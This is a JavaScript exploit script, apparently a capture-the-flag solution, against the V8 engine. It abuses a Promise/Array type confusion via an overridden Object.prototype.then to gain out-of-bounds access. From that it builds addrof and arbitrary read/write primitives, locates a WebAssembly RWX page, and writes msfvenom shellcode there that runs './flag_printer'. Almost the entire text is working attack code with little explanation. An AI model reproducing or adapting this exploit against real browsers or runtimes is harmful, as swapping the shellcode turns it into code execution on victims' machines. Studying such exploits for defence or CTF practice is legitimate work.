// =============================================================
// =============================================================
// =============================================================

function hex(val) {
  return "0x" + val.toString(16);
}

let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
  int_view[0] = this;
  return float_view[0];
}
BigInt.prototype.smi2f = function() {
  int_view[0] = this << 32n;
  return float_view[0];
}
Number.prototype.f2i = function() {
  float_view[0] = this;
  return int_view[0];
}
Number.prototype.f2smi = function() {
  float_view[0] = this;
  return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
  return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
  return BigInt(this).smi2f();
}

function hex(a) {
  return "0x" + a.toString(16);
}

// Create RWX page
let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let f = wasm_instance.exports.main;

// msfvenom --payload linux/x64/exec --format dword CMD="./flag_printer"
let shellcode = [0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x0000000f, 
0x6c662f2e, 0x705f6761, 0x746e6972, 0x56007265, 0xe6894857, 0x0000050f];

// =============================================================
// ================== Exploit starts here ======================
// =============================================================

// Need this to bypass the `TaggedEqual` check in `PromiseResolveThenableJob`
Object.prototype.then = Promise.prototype.then;

// What we confuse the JSPromise with
let oob_arr = [1.1];

// This will confuse the JSPromise object with our Array, and overwrite
// it's length to a PromiseReaction object's address (a.k.a makes it huge)
const promise = new Promise((a, b) => { a(oob_arr); });

// setTimeout so we can run this code after the promise is resolved
setTimeout(() => {
  let addrof_arr = [wasm_instance];
  let arb_rw_arr = [3.3];

  // Scan the heap for the 3.3, the leak will always be 4 behind it, while the
  // arb_rw idx will be 2 after it
  let leak_idx = undefined;
  let arb_rw_idx = undefined;

  for (let i = 0; i < 0x100; i++) {
    if (oob_arr[i].f2i() == 0x400a666666666666n) {
      leak_idx = i - 4;
      arb_rw_idx = i + 2;
    }
  }

  function addrof(obj) {
    addrof_arr[0] = obj;

    let leak = oob_arr[leak_idx].f2i();

    // Some heuristics to detect where the leak is
    if ((leak & 0xffffffffn) == 2n) 
      return leak >> 32n;
    else 
      return leak & 0xffffffffn;
  }

  function c_read32(addr) {
    oob_arr[arb_rw_idx] = ((addr - 8n) + (2n << 32n)).i2f();

    return arb_rw_arr[0].f2i();
  }

  function c_write64(addr, val) {
    oob_arr[arb_rw_idx] = ((addr - 8n) + (2n << 32n)).i2f();

    arb_rw_arr[0] = val.i2f();
  }

  let wasm_instance_addr = addrof(wasm_instance);
  let rwx_page_addr = c_read32(wasm_instance_addr + 0x68n);

  console.log("[+] wasm instance @ " + hex(wasm_instance_addr));
  console.log("[+] rwx page @ " + hex(rwx_page_addr));

  let typed_arr = new Uint32Array(0x200);
  let typed_arr_addr = addrof(typed_arr);

  c_write64(typed_arr_addr + 0x28n, rwx_page_addr);

  for (let i = 0; i < shellcode.length; i++) {
    typed_arr[i] = shellcode[i];
  }

  f();
}, 1000);
